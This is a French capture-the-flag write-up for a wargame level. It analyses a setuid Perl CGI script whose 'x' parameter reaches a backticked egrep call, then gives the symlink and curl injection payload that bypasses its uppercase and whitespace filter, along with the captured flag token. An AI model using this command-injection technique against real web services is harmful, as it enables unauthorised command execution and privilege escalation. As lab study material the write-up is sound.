# Level12

### Observations:
##### J'affiche le contenue du programme '~/level12.pl':
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

##### Details du programme:
```bash
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

Je me rend compte que ce programme est execute par defaut en tant qu'utilisateur 'flag12' grace a la commande:
```sh
ps aux | grep flag12
```

##### Entrees du programme:
```perl
string x
string y
```

##### Fonctionnement:
Ce programme est compose de deux fonctions aux utilitees douteuses:
 * La fonction \<t>:
	1. Applique un filtre sur 'x' qui transforme les lettres minuscules en majuscules.
	2. Applique un filtre sur 'x' qui enleve tout ce qu'il y a apres un caractere de separation.
	3. Execute une commande shell qui utilise la variable 'x' modifie.
 * La fonction \<n> est inutile dans son fonctionnement.

> Le programme tourne sur un serveur tcp par defaut

##### Conclusions:
Ce programme a une faille dans la fonction \<t> plus precisement au moment d'executer la commande shell. \
Nous pouvons inserer la commande que nous voulons dans celle-ci tant que nous respectons ces regles simples:
 - Utiliser uniquement des caracteres majuscule.
 - Ne pas ecrire de caracteres de separation.

### Solution:
Je creer un lien symbolique leger pour me permettre d'executer getflag avec des  caracteres majuscules. \
J'effectue une requete au serveur avec ma commande a injecter que je redirige dans le flux d'erreurs. \
Puis j'affiche la derniere ligne du fichier de log du flux d'erreurs.

#### commandes:
```bash
ln -s /bin/getflag /tmp/GETFLAG
curl '127.0.0.1:4646?x="$(/*/GETFLAG>%262)"'
tail -n 1 /var/log/apache2/error.log
```
> Notez l'utilisation de shellcode '%26' pour eviter que le caractere de '&' soit pris en compte dans le filtre de separateurs.


**token :** g1qKMiRpXf53AWhDaU7FEkczr